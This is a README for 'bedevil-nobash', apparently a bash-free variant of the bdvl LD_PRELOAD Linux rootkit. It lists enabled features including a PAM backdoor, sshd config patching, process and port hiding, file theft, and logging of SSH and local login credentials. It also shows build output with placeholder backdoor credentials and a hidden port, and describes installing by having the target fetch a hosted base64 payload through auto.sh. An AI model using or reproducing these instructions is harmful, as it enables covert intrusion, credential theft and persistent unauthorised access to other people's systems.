# bedevil-nobash

<img src=https://i.imgur.com/PyO00vy.png alt="icon" />

</br>

 * This is the same as the original [bdvl](https://github.com/kcaaj/bdvl) but however this version is not dependent on bash at all for setup or installation.
   * __At all.__
   * So naturally this repository is much different from the original.
   * This repository was created with _only_ the use of `auto.sh` in mind.
 * I'll detail information specific to this branch in this README, but for all other information such as stuff on certain functionalities please go check the original version out.

## Overview
 * This version of bdvl has the following functionalities enabled (_and are not that easily disabled_)
   * USE_PAM_BD
   * PATCH_SSHD_CONFIG
   * HIDE_SELF
   * FORGE_MAPS
   * HIDE_PORTS
   * DO_REINSTALL
   * DO_EVASIONS
   * READ_GID_FROM_FILE
     * AUTO_GID_CHANGER
     * HIDE_MY_ASS
   * BACKDOOR_UTIL
     * SET_MAGIC_ENV_UNHIDE
     * BACKDOOR_PKGMAN
   * LOG_LOCAL_AUTH
   * LOG_SSH
   * FILE_STEAL
   * USE_CRYPT
 * The dynamic linker libraries are patched at installation. This version of the rootkit is not designed to do anything otherwise, really.

<hr>

## Usage
 * This repository is extremely simple in comparison to the original.
 * Getting an installation up & running is a matter of editing your backdoor settings in `setup.py` & just few brief commands.
```
$ make
rm -rf new_inc
python setup.py
Username: changeme
Password: changeme
Hidden port: 13337
Install directory: /etc/hostslpxdf
        bash etc/ssh.sh changeme <host> 13337
cc -std=gnu99 -Wall -Inew_inc -g0 -O0 -shared -Wl,-soname,bdvl.so.x86_64 -fPIC new_inc/bedevil.c -lc -ldl -lcrypt -lpcap -o bdvl.so.x86_64
cc -m32 -std=gnu99 -Wall -Inew_inc -g0 -O0 -shared -Wl,-soname,bdvl.so.i686 -fPIC new_inc/bedevil.c -lc -ldl -lcrypt -lpcap -o bdvl.so.i686 2>/dev/null
make: [Makefile:17: kit] Error 1 (ignored)
strip bdvl.so*
```
 * When it comes to the actual installation, you have two choices.
 * Host the `new_inc.b64` file somewhere accessible from the target box & point the first variable in `auto.sh` to wherever `new_inc.b64` may be.
 * Or, on the box, when running `auto.sh` supply it a path as an argument to this file available locally.
 * `auto.sh` will do the rest of the work for when it comes to installation on the box.
